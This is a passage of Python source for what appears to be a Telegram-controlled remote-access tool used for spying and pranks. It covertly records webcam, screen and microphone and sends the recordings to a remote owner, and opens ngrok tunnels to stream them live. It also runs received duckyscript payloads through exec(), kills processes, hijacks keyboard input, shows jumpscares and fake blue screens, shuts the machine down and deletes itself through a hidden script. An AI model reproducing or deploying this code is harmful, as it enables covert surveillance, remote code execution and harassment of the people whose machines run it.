        response = requests.get(file_url)
        with open(filepath, "wb") as f:
            f.write(response.content) 
        new_filepath = ogg_to_wav(filepath, rmold=True)
        self.audio_player.play_wav(new_filepath, False)
        remove(new_filepath)

    def parse_command(self, text: str) -> None:
        try:
            print(f"Parsing command: {text}")
            args = text.split()
            command = args[0]

            if command.startswith("/"):
                command = args[0][1:]
            function_args = args[1:]
            function_args = map(lambda x:x.replace("<SPACE>"," "), function_args)
            function_args = list(map(lambda x: int(x) if x.isdigit() else x, function_args))

            func = self.function_table.get(command)
            if func:
                function_needed_args = get_required_params(func)
                if function_needed_args:
                    if function_needed_args[0] == "self":
                        function_needed_args=function_needed_args[1:]
                    
                function_all_args = get_function_parameters(func)
                if function_all_args:
                    if function_all_args[0] == "self":
                        function_all_args=function_all_args[1:]

                try:
                    if func in self.no_background_functions:
                        func(*function_args)
                    else:
                        skip_len = False
                        if "*args" in function_all_args:
                            skip_len = True
                        if (len(function_args) < len(function_needed_args) or len(function_args) > len(function_all_args)) and not(skip_len):
                            raise TypeError("Wrong number of arguments for this function")
                        if function_args:
                            thread_args = (*function_args,)
                            new_thread = Thread(target=func, args=thread_args)
                        else:
                            new_thread = Thread(target=func)
                        new_thread.start()
                except TypeError as e:
                    args = {} 
                    for arg in function_needed_args:
                        if arg == "self":
                            continue
                        response = self.send_prompt(f"Choose a {arg} for {command}")
                        if response is None:

                            self.operation_canceled(info="Action timed out.")
                            return
                        response = response.replace(" ","<SPACE>")
                        args[arg] = response
                    self.parse_command(f"/{command} " + " ".join(args.values()))

            elif command.startswith("PK"):
                if command == "PK_next_page" and self.process_explorer_menu:
                    self.process_killer_page += 1
                    self.process_killer(page=self.process_killer_page)
                elif command == "PK_previous_page" and self.process_explorer_menu:
                    self.process_killer_page -= 1
                    self.process_killer(page=self.process_killer_page)
                elif command == "PK_close_page" and self.process_explorer_menu:
                    self.process_explorer_menu.delete()
                elif command in ("PK_next_page", "PK_previous_page") and not self.process_explorer_menu:
                    self.bsend("Use /processkiller first")

            elif command.startswith("DISPLAYSET"):
                if command == "DISPLAYSET_close":
                    if self.display_mode_keyboard:
                        self.display_mode_keyboard.delete()
                        self.display_mode_keyboard = None

            elif command.startswith("MOUSE"):
                if command == "MOUSE_closemenu":
                    if self.mouse_controller_menu:
                        self.mouse_controller_menu.delete()
                        self.mouse_controller_menu = None

            elif command.startswith("MXR"):
                if command == "MXR_close":
                    if self.mixer_menu_keyboard:
                        self.mixer_menu_keyboard.delete()
                        self.mixer_menu_keyboard = None

            elif command.startswith("PROCMON"):
                if self.processmonitormenu:
                    if command == "PROCMON_close":
                        self.processmonitormenu.delete()
                        self.processmonitormenu = None
                    elif command.startswith("PROCMON_procmonrem"):
                        process = function_args[0]
                        self.processmonitorrem(process)
                        self.processmonitormenu.delete()
                        self.processmonitormenushow()

            elif command.startswith("CANTOP"):
                if command == "CANTOP_close":
                    self.cantopenmenu_ref.delete()
                    self.cantopenmenu_ref = None

            elif command.startswith("mainmenu"):
                if self.mainmenu_ref:
                    if command == "mainmenu_close":
                        self.mainmenu_ref.delete()
                        self.mainmenu_ref = None
                    elif command == "mainmenu_next":
                        self.mainmenu_ref.delete()
                        self.mainmenu_ref.send_next_page()
                    elif command == "mainmenu_prev":
                        self.mainmenu_ref.delete()
                        self.mainmenu_ref.send_previous_page()

            elif command.startswith("cancel_loading"):
                bar_id = int(command.split(":")[1])
                if bar_id in self.bars:
                    self.bars[bar_id].canceled = True
                    del self.bars[bar_id]
            else:
                self.bsend(f"Invalid command {command}")
        except Exception as e:
            self.bsendWithHtml(
                f"Error parsing command '{html.escape(text)}'\n"
                f"<pre>{html.escape(traceback.format_exc(limit=4))}</pre>"
            )
    
    def parse_video_note(self, saved_filepath: str, document: Any) -> None:
        duration = document.get("duration")
        print(f"Parsing video note: {saved_filepath}, {duration=}")
        prompt = (
        "🎯 *Select Position*\n\n"
        "Choose a position by number:\n\n"
        "1️⃣ *Top*\n"
        "2️⃣ *Bottom*\n"
        "3️⃣ *Left*\n"
        "4️⃣ *Right*\n"
        "5️⃣ *Center*\n\n"
        "Combinations:\n"
        "6️⃣ *Top\\-Left*\n"
        "7️⃣ *Top\\-Right*\n"
        "8️⃣ *Bottom\\-Left*\n"
        "9️⃣ *Bottom\\-Right*\n\n"
        "Reply with the corresponding *number*\\."
        )
        posx = {
            "1": "top",
            "2": "bottom",
            "3": "left",
            "4": "right",
            "5": "center",
            "6": "top-left",
            "7": "top-right",
            "8": "bottom-left",
            "9": "bottom-right",
        }
        pos_idx = self.send_prompt(prompt, delete=True)
        if pos_idx is None:
            self.operation_canceled("Action timed out.")
            return
        if not pos_idx.isnumeric():
            self.operation_canceled(f"Choose an option between 1 and {max(posx.keys())}")
            return
        bar = self.new_loading_bar_timed_worker(label="Playing Video Note", duration=int(duration),
                                          target=self.overlay_tk.video_note_overlay,
                                          args=(saved_filepath, posx[pos_idx]),
                                          on_cancel=self.overlay_tk._safe_destroy, block_default_cancel=True)
        if not bar: return
        bar.start()
        #self.overlay_tk.video_note_overlay(saved_filepath, posx[pos_idx])

    def parse_video(self, msg, document, saved_filepath: str, saved_filename: str) -> None:
        print(f"Parsing video: {saved_filename}")
        caption = msg["caption"].lower().strip()
        if caption == "/setvideowallpaper":
            if not self.confirmContuinuingWithoutWallpaperBackup():
                return
            duration = document["duration"]
            video_stream = VideoCapture(saved_filepath)
            res = True
            start=monotonic()
            while res and (monotonic()-start)<=duration:
                res, frame = video_stream.read()
                imwrite("tmp.png", frame)
                change_wallpaper(abspath("tmp.png"))
            remove("tmp.png")
            self.restore_wallpaper()
        
        elif caption.startswith("/save"):
            try:
                args = caption.split()
                if len(args)>1:
                    filepath = " ".join(caption.split()[1:])
                    containts_filename = "." in pathsplit(filepath)[-1]
                    if containts_filename:
                        rename(saved_filepath, filepath)
                    else:
                        rename(saved_filepath, join(filepath, saved_filename+".mp4"))
                    self.bsend(f"{emoji_dict['file']} File saved successfully.")
                    return
            except Exception as e:
                self.bsend(f"{emoji_dict['file']} Could not save the file. {e}")
                return

    def parse_document(self, msg: dict[str:str], mimetype: str="document") -> None:
        print(f"Parsing document: {mimetype}")
        document = msg[mimetype]
        file_id = document["file_id"]
        saved_filename = randomname()
        saved_filepath = join(BURN_DIRECTORY, saved_filename)
        self.bot.download_file(file_id, saved_filepath)
        if mimetype == "document": 
            filename = document["file_name"]
            if filename.endswith(".dd"):
                with open(saved_filepath, "r") as fi:
                    content = fi.read()
                payload_python = toducky(content)
                self.bsend(f"Executing duckyscript {filename}({saved_filename})")
                exec(payload_python)
                remove(saved_filepath)

        elif mimetype == "video":
            self.parse_video(msg, document, saved_filepath, saved_filename)

        elif mimetype == "video_note":
            print("VIDEO NOTE")
            self.parse_video_note(saved_filepath, document)


    def parse_photo(self, msg: dict) -> None:
        print("Parsing photo message")
        filename = randompngname()
        saved_filepath = join(BURN_DIRECTORY, filename)
        self.bot.download_file(msg['photo'][-1]['file_id'], saved_filepath)
        if "caption" in msg.keys():
            caption = msg["caption"]
            if caption == "/jumpscare":
                self.jumpscare(saved_filepath)
                return

            elif caption.startswith("/save"):
                try:
                    args = caption.split()
                    if len(args)>1:
                        filepath = " ".join(caption.split()[1:])
                        containts_filename = "." in pathsplit(filepath)[-1]
                        if containts_filename:
                            rename(saved_filepath, filepath)
                        else:
                            rename(saved_filepath, join(filepath, filename))
                        self.bsend(f"{emoji_dict['file']} File saved successfully.")
                        return
                except Exception as e:
                    self.bsend(f"{emoji_dict['file']} Could not save the file. {e}")
                    return

        Thread(target=self.show_image, args=[filepath,]).start()
        sleep(0.5)
        remove(filepath)

    def parse_text(self, msg: dict) -> None:
        print(f"Parsing text message: {msg['text'][:50]}...")
        text = msg["text"]
        date = int(msg["date"])
        if (date+self.message_timeout)<monotonic():
            return
        if self.user["status"] is None:
            if text == "/start":
                return None
            elif ";" in text:
                commands = text.split(";")
                for command in commands:
                    self.parse_command(command) 
            else:
                self.parse_command(text)
        elif self.user["status"] == "input_requested":
            self.user["last_response"] = text.strip()

    def plankton(self, audio=True) -> None:
        print(f"Playing Plankton meme, audio={audio}")
        self.jumpscare("plankton_meme", "plankton", playaudio=audio, setvolume=50)

    def planktonnoaudio(self) -> None:
        print("Playing Plankton meme without audio")
        self.plankton(audio=False)
    
    def processmonitoradd(self, processname: str) -> None:
        print(f"Adding {processname} to process monitor")
        self.bsend(f"💻 {processname} added to process monitor's list.")
        self.processmonitorlist.update({processname:False})
    
    def processmonitorrem(self, processname: str) -> None:
        print(f"Removing {processname} from process monitor")
        try:
            del self.processmonitorlist[processname]
            self.bsend(f"💻 {processname} removed to process monitor's list.")
        except:
            self.bsend(f"💻 {processname} was not inside process monitor's list.")

    def processmonitormenushow(self) -> None:
        print("Showing process monitor menu")
        self.processmonitormenu = self.new_menu({
            x:f"PROCMON_procmonrem {x}" for x, _ in self.processmonitorlist.items()
        }, close_btn_lab="PROCMON_close")

    def processmonitorloop(self) -> None:
        print("Starting process monitor loop")
        while self.running:
            for process, checked in self.processmonitorlist.items():
                if self.check_if_proc_running(process) and not checked:
                    self.bsendWithHtml(f"⚠️ <b>Process Active</b>\n<code>{html.escape(process)}</code>")
                    self.processmonitorlist[process]=True
                elif not(self.check_if_proc_running(process)):
                    self.processmonitorlist[process]=False
            sleep(2)

    def process_killer(self, page=0) -> None:
        print("Opening process killer")
        if self.process_explorer_menu is None:
            self.process_killer_page = 0
        else:
            self.process_explorer_menu.delete()
            self.process_killer_page = page
        processes = [x.name() for x in psutil.process_iter()] 
        self.process_explorer_menu = self.new_menu({process:f"/terminateprocess {process}" for process in processes}, next_btn=True, autosend=True, page=self.process_killer_page, next_btn_lab="PK_next_page", prev_btn_lab="PK_previous_page", close_btn_lab="PK_close_page", rows=3)
        return self.process_explorer_menu

    def pss(self) -> None:
        print("Playing 'pss' sound")
        self.__play_loaded_sound("pss")

    def behindyou_kid(self) -> None:
        print("Playing 'behind you kid' sound")
        self.__play_loaded_sound("behindyou_kid")

    def behindyou_whisper(self) -> None:
        print("Playing 'behind you whisper' sound")
        self.__play_loaded_sound("behindyou_whisper")

    def scream_11s(self) -> None:
        print("Playing 11-second scream")
        self.__play_loaded_sound("scream_11s")

    def scream_15s(self) -> None:
        print("Playing 15-second scream")
        self.__play_loaded_sound("scream_15s")

    def playrandomnoise(self, duration: int) -> None:
        print(f"Playing random noise for {duration} seconds")
        start = monotonic()
        loading_bar = self.new_loading_bar(duration, label="📡 Play Random Noise")
        if not loading_bar: return
        thread = Thread(target=self.audio_player.play_random_noise, args=(duration,))
        thread.start()
        while (monotonic()-start) < duration:
            elapsed = int(monotonic()-start)
            loading_bar.update(elapsed)
            if loading_bar.canceled:
                break
            sleep(1)
        loading_bar.fill_and_delete()

    def whisper_overlay(self, duration: int, whispers: str | list[str] | None = None) -> None:
        print(f"Showing whisper overlay for {duration} seconds")
        self.overlay_tk.whisper_overlay(duration, whispers)

    def knockknock(self) -> None:
        print("Playing knock knock sound")
        self.__play_loaded_sound("knockknock")

    def fart(self) -> None:
        print("Playing fart sound")
        self.__play_loaded_sound("fart")

    def fake_bsod(self, duration: int = 15, qr_url: str = None):
        self.overlay_tk.fake_bsod(duration=float(duration), qr_code_url=qr_url)
        self.bsend(f"Fake BSOD activated for {duration} seconds (Comic Sans + dual progress bars)")

    def replyquickmenu(self) -> int:
        print("Creating reply quick menu")
        commands = [f"/{c.name}" for c in self.commands]
        keyboard = [commands[i:i + 2] for i in range(0, len(commands), 2)]        
        return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)

    def randomkeyboard(self, timeout: int =5) -> None:
        print(f"Random keyboard input for {timeout} seconds")
        start = monotonic()
        loading_bar = self.new_loading_bar(timeout, label=f"{emoji_dict['keyboard']} Random Keyboard", showperc=True)
        if not loading_bar: return
        while (monotonic()-start)<timeout:
            loading_bar.update(monotonic()-start)
            if loading_bar.canceled:
                loading_bar.fill_and_delete()
                return
            event = read_event()
            if event.event_type == KEY_DOWN:
                e = event.name.split()[0]
                if e in printable:
                    pg.press("backspace")
                    pg.write(choice(printable))
        loading_bar.set100()
        loading_bar.delete()

    def record_audio(self, filename, seconds, samplerate=48000) -> bool|Exception:
        print(f"Recording audio for {seconds} seconds to {filename}")
        try:
            seconds = float(seconds)
            frames = int(seconds * samplerate)
            data = sd.rec(frames, samplerate=samplerate, channels=1, dtype='int16')
            sd.wait()
            sf.write(filename, data, samplerate)
            return True
        except Exception as e:
            return e 

    def record_jumpscare_reaction(self, onlycamera=False) -> None:
        print(f"Recording jumpscare reaction, onlycamera={onlycamera}")
        if onlycamera:
            recording_thread = Thread(target=self.record_webcam, args=(20,))
        else:
            recording_thread = Thread(target=self.record_webcam_and_screen, args=(20,))

        recording_thread.start()
        status_message = self.new_editable_message("Recording")
        sleep(10)
        self.jumpscare(playaudio=True)
        status_message.edit("Jumpscared!")
        recording_thread.join()
        status_message.delete()

    def record_screen(self, duration: int=10, caption: str|None=None) -> None:
        print(f"Recording screen for {duration} seconds")
        duration = int(duration)
        bar = self.new_loading_bar(duration, label="🖥️ Recording Screen")
        if not bar: return
        try:
            filename = join(f"{BURN_DIRECTORY}", f"{randomname()}.mp4")
            audio_filename = join(f"{BURN_DIRECTORY}",f"{randomname()}.wav")
            SCREEN_SIZE = tuple(pg.size())
            fourcc = VideoWriter_fourcc(*'XVID')
            out = VideoWriter(filename, fourcc, 20.0, SCREEN_SIZE)
            start_time = monotonic()
            samplerate = 44100
            channels = 1
            frames = int(duration * samplerate)
            audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')

            time_elapsed = 0
            while int(time_elapsed) < duration:
                if bar.canceled:
                    bar.fill_and_delete()
                    return
                time_elapsed = monotonic() - start_time
                bar.progress = time_elapsed
                bar.update()
                img = pg.screenshot()
                img = np.array(img)
                img = cvtColor(img, COLOR_BGR2RGB)
                out.write(img)
            bar.set100()

            sd.wait()
            out.release()
            sf.write(audio_filename, audio_data, samplerate)
            video_clip = VideoFileClip(filename)
            audio_clip = AudioFileClip(audio_filename)
            video_with_audio = video_clip.set_audio(audio_clip)
            final_filename = filename.replace(".mp4", "_final.mp4")
            video_with_audio.write_videofile(final_filename, logger=None)
            tmploadingmessage = self.new_editable_message("Sending recording...", True)
            with open(final_filename, "rb") as video:
                response = self.bot.sendVideo(self.owner_id, video, caption=caption)
                self.all_session_messages.append(response["message_id"])
            tmploadingmessage.delete()
            remove(filename)
            remove(audio_filename)
            remove(final_filename)
        except Exception as e:
            self.bsend(f"Error while recording screen: {e}")
        bar.fill_and_delete()

    def record_webcam(self, duration: int = 10, caption: str | None = None) -> None:
        try:
            duration = int(duration)
            bar = self.new_loading_bar(duration, label="📹 Recording Webcam", showperc=True)
            if not bar: return

            filename = join(BURN_DIRECTORY, f"{randomname()}.mp4")
            audio_file = join(BURN_DIRECTORY, f"{randomname()}.wav")

            fourcc = VideoWriter_fourcc(*"XVID")
            self.opencap()
            w = int(self.cap.get(CAP_PROP_FRAME_WIDTH))
            h = int(self.cap.get(CAP_PROP_FRAME_HEIGHT))
            out = VideoWriter(filename, fourcc, 20.0, (w, h))

            start = monotonic()
            audio_data = sd.rec(int(duration * 44100), samplerate=44100, channels=1, dtype="int16")

            while monotonic() - start < duration:
                if bar.canceled:
                    bar.fill_and_delete()
                    out.release()
                    self.closecap()
                    return

                bar.update(monotonic() - start)
                ret, frame = self.cap.read()
                if ret:
                    out.write(frame)
                sleep(0.001)

            bar.fill_and_delete()
            sd.wait()
            out.release()
            self.closecap()

            sf.write(audio_file, audio_data, 44100)

            # merge audio+video (your existing moviepy logic)
            video = VideoFileClip(filename)
            audio = AudioFileClip(audio_file)
            final = video.set_audio(audio)
            final_file = filename.replace(".mp4", "_final.mp4")
            final.write_videofile(final_file, logger=None, verbose=False)

            tmpload = self.new_editable_message("Uploading recording...")
            with open(final_file, "rb") as vid:
                resp = self.bot.sendVideo(self.owner_id, vid, caption=caption)
                self.all_session_messages.append(resp["message_id"])
            tmpload.delete()

            for f in (filename, audio_file, final_file):
                if exists(f):
                    remove(f)

        except Exception as e:
            self.bsendWithHtml(
                f"Error during webcam recording\n<pre>{html.escape(str(e))}</pre>"
            )
            if "bar" in locals():
                bar.fill_and_delete()

    # This code is like an impressive skycraper held by a little wire.

    def record_webcam_and_screen(self, capture_duration: int=10, caption: str|None=None) -> None:
        print(f"Recording webcam and screen for {capture_duration} seconds")
        capture_duration = int(capture_duration)
        bar = self.new_loading_bar(capture_duration, label="📹🖥️ Recording Webcam & Screen")
        if not bar: return
        try:
            filename = join(BURN_DIRECTORY, randomname()+".mp4")
            audio_filename = join(BURN_DIRECTORY, randomname()+".wav")
            SCREEN_SIZE = tuple(pg.size())
            fourcc = VideoWriter_fourcc(*'XVID')
            out = VideoWriter(filename, fourcc, 20.0, SCREEN_SIZE)
            self.opencap()
            webcam = self.cap
            start_time = monotonic()
            samplerate = 44100
            channels = 1
            frames = int(capture_duration * samplerate)
            audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')

            time_elapsed = 0 
            while int(time_elapsed) < capture_duration:
                if bar.canceled:
                    bar.fill_and_delete()
                    return
                time_elapsed = monotonic() - start_time
                bar.progress = time_elapsed
                bar.update()
                img = pg.screenshot()
                img = np.array(img)
                img = cvtColor(img, COLOR_BGR2RGB)
                _, frame = webcam.read()
                fr_height, fr_width, _ = frame.shape
                frame = resize(frame, (fr_width//2, fr_height//2))
                fr_height, fr_width, _ = frame.shape
                img[0:fr_height, 0:fr_width, :] = frame[0:fr_height, 0:fr_width, :]
                out.write(img)
            bar.set100()
            sd.wait()
            out.release()
            self.closecap()
            sf.write(audio_filename, audio_data, samplerate)
            video_clip = VideoFileClip(filename)
            audio_clip = AudioFileClip(audio_filename)
            video_with_audio = video_clip.set_audio(audio_clip)
            final_filename = filename.replace(".mp4", "_final.mp4")      #this was torture
            video_with_audio.write_videofile(final_filename, logger=None)#someone must pay for this
            tmploadingmessage = self.new_editable_message("Sending recording...", True)
            with open(final_filename, "rb") as video:
                response = self.bot.sendVideo(self.owner_id, video, caption=caption)
                self.all_session_messages.append(response["message_id"])
            tmploadingmessage.delete()
            remove(filename)
            remove(audio_filename)
            remove(final_filename)
        except Exception as e:
            e = traceback.format_exc()
            self.bsend(f"Error while sending video clip\n{e}")
        bar.fill_and_delete()

    def removefromcantopen(self, process: str) -> None:
        print(f"Removing {process} from cantopen list")
        self.cantopenmenu_ref.delete()
        self.cantopenlist.remove(process)
        self.cantopenmenu()
        self.bsend(f"🔒 Removed {process} to cantopenlist.")

    def restore_wallpaper(self) -> None:
        print("Restoring wallpaper")
        if self.backup_wallpaper_path:
            self.bsend("Wallpaper backup was not created so restoring it is not currently possible.")
            return
        change_wallpaper(self.backup_wallpaper_path)

    def rightclick(self) -> None:
        print("Right mouse click")
        pg.rightClick() #no shit

    def screenshot(self) -> None: #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
        print("Taking screenshot")
        try:
            for scrt in fast_screenshot():
                mon, img = scrt["monitor"],scrt["screenshot"]
                f = cv2_to_bytesio(img)
                f.name = "Screenshot.png"
            self.__send_image(image_buf=f, caption=mon)
        except Exception as e:
            return self.bsend(f"Error while getting screenshot\n{e}")

    def screenshotandselfie(self) -> None:
        print("Taking screenshot and selfie")
        self.opencap()
        for scrt in fast_screenshot():
            mon, img = scrt["monitor"],scrt["screenshot"]
            ret, image = screen_and_webcam_pic(self.cap, img)
            if not ret: continue
            
            self.__send_image(image_buf=cv2_to_bytesio(image), caption=mon)
            try:
                remove(name)
            except:
                ...
        self.closecap()

    def selfie(self, caption: str | None = None, reply_markup=None) -> bool:
        try:
            filename = join(BURN_DIRECTORY, randompngname())
            self.opencap()
            ret, frame = self.cap.read()
            if not ret:
                raise RuntimeError("Webcam read failed")

            imwrite(filename, frame)
            with open(filename, "rb") as f:
                resp = self.bot.sendPhoto(
                    self.owner_id,
                    f,
                    caption=caption,
                    reply_markup=reply_markup,
                    parse_mode="HTML"
                )
                self.all_session_messages.append(resp["message_id"])

            remove(filename)
            self.closecap()
            return True

        except Exception as e:
            self.bsendWithHtml(
                f"Error while taking selfie\n<pre>{html.escape(str(e))}</pre>"
            )
            return False

    def send_record_audio(self, seconds: int=5, caption: str|None=None) -> None:
        print(f"Recording and sending audio for {seconds} seconds")
        message = self.new_editable_message(f"{emoji_dict['microphone']} Recording audio of {seconds} seconds.")
        filename = randomname()+".wav"
        filepath = join(BURN_DIRECTORY, filename)
        res = self.record_audio(filepath, seconds)
        if isinstance(res, Exception):
            err = f"Error while recording audio: {res}"
            self.bsend(err)
        else:
            message.edit("Done recording, sending...")
            filepath = wav_to_ogg(filepath, rmold=True)
            with open(filepath, "rb") as fi:
                self.bot.sendVoice(self.owner_id, fi, caption=caption)
            remove(filepath)
            message.delete()

    def confirmContuinuingWithoutWallpaperBackup(self):
        print("Confirming wallpaper backup")
        if not self.backup_wallpaper_path:
            return self.ask_yesno("The program was unable to backup the wallpaper, do you still want to use this functionality Y/n")
        else:
            return True

    def connectioncheckerloop(self):
        print("Starting connection checker loop")
        while self.running:
            chk = False
            if not self.connected:
                chk = True
            self.connected = check_connection()
            if self.connected and chk:
                print(f"Connection got back at {now()}")
            if not self.connected:
                print(f"Connection lost at {now()}")
            sleep(5)


    def setCameraAsWallpaper(self, seconds: float|int=5):
        print(f"Setting camera as wallpaper for {seconds} seconds")
        if not self.confirmContuinuingWithoutWallpaperBackup():
            return
        seconds = int(seconds)
        loading_bar = self.new_loading_bar(label="📷 Set Camera As Wallpaper", total=seconds, showperc=True)
        if not loading_bar: return
        filename = join(BURN_DIRECTORY, "jxframe.png")
        start = monotonic()
        res = True
        self.opencap()
        while monotonic()-start <= seconds and res:
            if loading_bar.canceled:
                break
            loading_bar.update(monotonic()-start)
            res, frame = self.cap.read()
            frame = pad_to_16_9(frame)
            imwrite(filename, frame)
            change_wallpaper(filename)
        loading_bar.set100()
        self.closecap()
        sleep(1)
        try:
            remove(filename)
        except FileNotFoundError:
            ...
        loading_bar.delete()
        self.restore_wallpaper()

    def set_volume(self, volume):
        print(f"Setting volume to {volume}")
        if volume in range(0, 101):
            self.audio_mixer.setVolumePercentage(volume)
        else:
            self.bsend(f"Volume must be from 0.0 to 100.0")

    def setvideowallpaper(self, videofilename: str) -> None:
        print(f"Setting video as wallpaper: {videofilename}")
        if not self.confirmContuinuingWithoutWallpaperBackup():
            return
        res = True
        filename = join(BURN_DIRECTORY, "jxframe.png")
        backup_filename = join(BURN_DIRECTORY, "backup.png")
        self.opencap()
        video = VideoCapture(abspath(videofilename))
        while res:
            res, frame = video.read()
            imwrite(frame)
            change_wallpaper(filename)
        change_wallpaper(backup_filename)
        remove(filename)
        remove(backup_filename)
        self.closecap()
        self.restore_wallpaper()

    def selfdestruction(self) -> None:
        print("Starting self destruction")
        if not self.ask_yesno():
            self.operation_canceled()
            return
        current_file = realpath(sys.argv[0])
        temp_dir = gettempdir()
        if iswindows:
            bat_file = join(temp_dir, "delete_me.bat")
            with open(bat_file, "w") as f:
                f.write(f':loop\ndel "{current_file}" > nul\nif exist "{current_file}" goto loop\ndel "%~f0"')
            Popen(['cmd', '/c', bat_file], creationflags=CREATE_NO_WINDOW)
        else:
            sh_file = join(temp_dir, "delete_me.sh")
            with open(sh_file, "w") as f:
                f.write(f'#!/bin/sh\nTARGET="{current_file}"\nwhile [ -e "$TARGET" ]; do\n\trm "$TARGET"\n\tsleep 0.5\n\tdone\n\trm -- "$0"')
                # :(
            chmod(sh_file, 0o700)
            Popen(['sh', sh_file]) 
        self.bsend(f"🛑 Removing executable.")
        self.stop()

    def show_help(self) -> None:
        """Send help messages in parts."""
        help_parts = self.help  # This should now be a list
        for i, part in enumerate(help_parts, 1):
            self.bsend(part)

    def show_image(self, image_path: str) -> None:
        print(f"Showing image: {image_path}")
        try:
            imshow("Warning", resize(imread(image_path), (400, 400)))
            setWindowProperty("Warning", WND_PROP_TOPMOST, 1)
            waitKey(0)
            destroyWindow("Warning")
            remove(image_path)
        except Exception as e:
            self.bsend(f"Error while trying to show image: \n{e}")

    def show_qr_overlay(self, url: str, text: str = "Scan me", duration: int = None):
        self.overlay_tk.qr_overlay(
            url=url,
            custom_text=text,
            duration=float(duration) if duration else None
        )
        self.bsend(f"QR overlay shown: {url}")

    def shutdown(self, seconds=0) -> None:
        print(f"Shutting down in {seconds} seconds")
        if not self.ask_yesno():
            self.operation_canceled()
            return
        system(f"shutdown -s -t {seconds}")

    def spam_windows(self, n: int, text: str) -> None:
        print(f"Spamming {n} windows with text: {text}")
        for i in range(n):
            sp_win = Thread(target=self.message_box, args=["Warning", text,])
            sp_win.start()
    
    def stop_webcam_and_screen_tunnel(self, verbose=True) -> None:
        print("Stopping webcam and screen tunnel")
        if self.webcam_and_screen_url:
            self.tunnelhandler.stop_service("webcamandscreen")
            self.webcam_and_screen_url = None
            if verbose:
                self.bsend(f"📸🖥️ Webcam & Screen tunnel closed")
            return
        if verbose:
            self.bsend(f"📸🖥️ You have no Webcam & Screen tunnel opened")

    def stop_webcam_tunnel(self, verbose=True) -> None:
        print("Stopping webcam tunnel")
        if self.webcam_url:
            self.closecap()
            self.tunnelhandler.stop_service("webcam")
            self.webcam_url = None
            if verbose:
                self.bsend(f"📸 Webcam tunnel closed")
            return
        if verbose:
            self.bsend(f"📸 You have no Webcam tunnel opened")

    def stop_screen_tunnel(self, verbose=True) -> None:
        print("Stopping screen tunnel")
        if self.screen_url:
            self.tunnelhandler.stop_service("screen")
            self.screen_url = None
            if verbose:
                self.bsend(f"🖥️ Screen tunnel closed")
            return
        if verbose:
            self.bsend(f"🖥️ You have no Screen tunnel opened")

    def stop_all_tunnels(self) -> None:
        print("Stopping all tunnels")
        e = self.new_editable_message("Closing all tunnels..")
        self.stop_screen_tunnel(False)
        self.stop_webcam_and_screen_tunnel(False)
        self.stop_webcam_tunnel(False)
        e.edit("Done.")
        e.delete()

    def start_webcam_and_screen_tunnel(self) -> None:
        print("Starting webcam and screen tunnel")
        self.stop_all_tunnels()
        if self.can_use_ngrok or self.tunnel_provider == "localtunnel":
            if self.webcam_and_screen_url is None:
                self.webcam_and_screen_url, password = self.tunnelhandler.start_webcam_and_screen_stream(
                    cap=self.cap
                )
                warning = generate_warning_for_url(self.webcam_and_screen_url)
                url_md = escape_md(self.webcam_and_screen_url)
                self.bsendWithHtml(
                    f"📸🖥️ <b>Webcam & Screen Tunnel Started</b>\n"
                    f"URL: <a href=\"{html.escape(url_md)}\">{html.escape(url_md)}</a>\n"
                    f"Password: <code>{html.escape(password)}</code>\n"
                    f"Warning: <code>{html.escape(warning)}</code>"
                )
            else:
                url_md = escape_md(self.webcam_and_screen_url)
                self.bsendWithHtml(
                    f"📸🖥️ <b>Webcam & Screen Tunnel Already Running</b>\n"
                    f"URL: <a href=\"{html.escape(url_md)}\">{html.escape(url_md)}</a>"
                )
        else:
            self.bsendWithHtml("⚠️ You cannot start the tunnel because no ngrok token was provided.")

    def start_webcam_tunnel(self) -> None:
        print("Starting webcam tunnel")
        self.stop_all_tunnels()
        if self.can_use_ngrok or self.tunnel_provider == "localtunnel":
            if self.webcam_url is None:
                self.webcam_url, password = self.tunnelhandler.start_webcam_stream(cap=self.cap)
                warning = generate_warning_for_url(self.webcam_url)
                url_md = escape_md(self.webcam_url)
                self.bsendWithHtml(
                    f"📸 <b>Webcam Tunnel Started</b>\n"
                    f"URL: <a href=\"{html.escape(url_md)}\">{html.escape(url_md)}</a>\n"
                    f"Password: <code>{html.escape(password)}</code>\n"
                    f"Warning: <code>{html.escape(warning)}</code>"
                )
            else:
                url_md = escape_md(self.webcam_url)
                self.bsendWithHtml(
                    f"📸 <b>Webcam Tunnel Already Running</b>\n"
                    f"URL: <a href=\"{html.escape(url_md)}\">{html.escape(url_md)}</a>"
                )
        else:
            self.bsendWithHtml("⚠️ You cannot start the tunnel because no ngrok token was provided.")

    def start_screen_tunnel(self) -> None:
        print("Starting screen tunnel")
        self.stop_all_tunnels()
        if self.can_use_ngrok or self.tunnel_provider == "localtunnel":
            if self.screen_url is None:
                self.screen_url, password = self.tunnelhandler.start_screen_stream()
                warning = generate_warning_for_url(self.screen_url)
                url_md = escape_md(self.screen_url)
                self.bsendWithHtml(
                    f"🖥️ <b>Screen Tunnel Started</b>\n"
                    f"URL: <a href=\"{html.escape(url_md)}\">{html.escape(url_md)}</a>\n"
                    f"Password: <code>{html.escape(password)}</code>\n"
                    f"Warning: <code>{html.escape(warning)}</code>"
                )
            else:
                url_md = escape_md(self.screen_url)
                self.bsendWithHtml(
                    f"🖥️ <b>Screen Tunnel Already Running</b>\n"
                    f"URL: <a href=\"{html.escape(url_md)}\">{html.escape(url_md)}</a>"
                )
        else:
            self.bsendWithHtml("⚠️ You cannot start the tunnel because no ngrok token was provided.")

    def send_prompt(self, question: str, timeout: int = 30, delete: bool = False) -> str|None:
        print(f"Sending prompt: {question}")
        msgid = self.bsendWithHtml(question)
        self.user["status"]="input_requested"
        self.user["last_response"]=None
        start = monotonic()
        while not self.user["last_response"] and monotonic()-start < timeout:
            sleep(1)
        else:
            tmp = self.user["last_response"]
            self.user["last_response"]=None
            self.user["status"] = None
            if delete:
                self.delete_message(msgid)
            return tmp

    def start(self) -> None:
        print("Starting bot")
        STARTING_LOG_MESSAGE = self.new_editable_message("🚀 STARTING")
        #Getting rid of old shi
        try:
            self.bot.deleteWebhook()
        except MaxRetryError:
            #don't care
            ...
        STARTING_LOG_MESSAGE.edit("🗑️ DELETED WEBHOOK")

        self.bot.getUpdates()
        STARTING_LOG_MESSAGE.edit("🔄 GOT UPDATES")

        self.images = load_images()
